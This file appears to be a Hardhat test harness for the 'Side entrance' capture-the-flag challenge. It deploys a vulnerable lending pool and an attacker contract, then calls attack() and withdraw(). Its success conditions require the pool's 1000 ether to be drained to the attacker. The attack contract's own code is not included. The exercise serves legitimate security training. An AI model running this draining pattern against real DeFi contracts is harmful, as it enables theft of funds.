const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();
        console.log("\nattacker : ",attacker.address)

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        const AttackSideEntranceFactory = await ethers.getContractFactory('AttackSideEntrance', attacker);

        this.pool = await SideEntranceLenderPoolFactory.deploy();
        this.AttackSideEntrance = await AttackSideEntranceFactory.deploy(this.pool.address);
        
        console.log("pool : ",this.pool.address)
        console.log("AttackSideEntrance : ",this.AttackSideEntrance.address)
        console.log()
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        console.log("\nAttack Contract Balance (1): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))
        tx = await this.AttackSideEntrance.connect(attacker).attack(ETHER_IN_POOL)
        tx.wait()

        console.log("\nAttack Contract Balance (2): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))

        tx = await this.AttackSideEntrance.connect(attacker).withdraw()
        tx.wait()

        console.log("\nAttack Contract Balance (3): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
